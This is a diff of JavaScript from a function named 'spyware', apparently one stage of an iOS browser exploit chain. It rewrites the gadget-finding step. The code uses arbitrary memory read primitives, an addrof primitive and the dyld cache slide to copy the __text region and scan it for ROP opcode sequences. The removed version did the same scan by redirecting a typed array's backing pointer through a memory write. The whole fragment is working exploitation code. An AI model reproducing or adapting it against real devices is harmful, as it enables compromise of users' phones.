@@ -290,45 +290,58 @@ function spyware(stage1, memory, binary)
                             {
                                 match[keys[z]] = 0;
                             }
-                            var b = memory.read(Add(base, o + 0x20), 0x10);
-                            var addr = Add(new Int64(b.slice(0, 8)), cache_slide);
-                            var size = new Int64(b.slice(8, 16));
-                            if(size.hi() != 0)
-                            {
-                                fail("opcodes");
+
+                            var addr = Add(memory.readInt64(Add(base, o + 0x20)), cache_slide)
+                            var size = memory.u32(Add(base, o + 0x28))
+
+                            // Copy the entire __text region into a Uint32Array for faster processing.
+                            // Previously you could map a Uint32Array over the data, but on i7+ devices 
+                            // this caused access violations (possibly due to SMAP -- please confirm).
+                            // Instead we read the entire region and copy it into a Uint32Array. The
+                            // memory.read primitive has a weird limitation where it's only able to read
+                            // up to 4096 bytes. to get around this we'll read multiple times and combine
+                            // them into one.
+
+                            var allData = new Uint32Array(size / 4)
+                            for (var r = 0; r < size; r += 4096) {
+                                // Check to ensure we don't read out of the region we want
+                                var qty = 4096
+                                if (size - r < qty) {
+                                    qty = size - r 
+                                }
+                                var data = memory.read(Add(addr, r), qty)
+                            
+                                // Data is an array of single bytes. This code takes four entries
+                                // and converts them into a single 32-bit integer. It then adds it 
+                                // into the `allData` array at the given index
+                                for (var h = 0; h < qty; h += 4) {
+                                    var fourBytes = b2u32(data.slice(h, h + 4))
+                                    allData[(r + h) / 4] = fourBytes
+                                }
                             }
-                            size = size.lo();
-                            // This is a fucking monster region, need fast mem access for this shit
-                            var lel = new Uint32Array(size/4);
-                            var laddr = Add(stage1.addrof(lel), 0x10);
-                            var lold = memory.readInt64(laddr);
-                            memory.writeInt64(laddr, addr);
-                            for(var ff = 0; ff < size/4 && keys.length > 0; ++ff)
-                            {
-                                var op = lel[ff];
-                                for(var z = 0; z < keys.length; ++z)
-                                {
-                                    var ky = keys[z];
-                                    var vl = opcodes[ky];
-                                    if(op == vl[match[ky]])
-                                    {
-                                        ++match[ky];
-                                        if(match[ky] == vl.length)
-                                        {
-                                            gadgets[ky] = Add(addr, (ff - (vl.length - 1)) * 4);
-                                            keys.splice(z, 1);
-                                            break;
+
+                            // Loop through the entire data map looking for each gadget we need
+                            for (var f = 0; f < size && keys.length > 0; f++) {
+                                var op = allData[f]
+                                
+                                for (var z = 0; z < keys.length; z++) {
+                                    var key = keys[z]
+                                    var opcode = opcodes[key]
+
+                                    if (op == opcode[match[key]]) {
+                                        match[key]++
+                                        if (match[key] == opcode.length) {
+                                            gadgets[key] = Add(addr, (f - (opcode.length - 1)) * 4)
+                                            keys.splice(z, 1)
+                                            break
                                         }
-                                    }
-                                    else
-                                    {
-                                        match[ky] = 0;
+                                    } else {
+                                        match[key] = 0
                                     }
                                 }
                             }
-                            memory.writeInt64(laddr, lold);
-                            lel = null; // be gone, foul array
-                            break;
+
+                            break
                         }
                         o += 0x50;
                     }
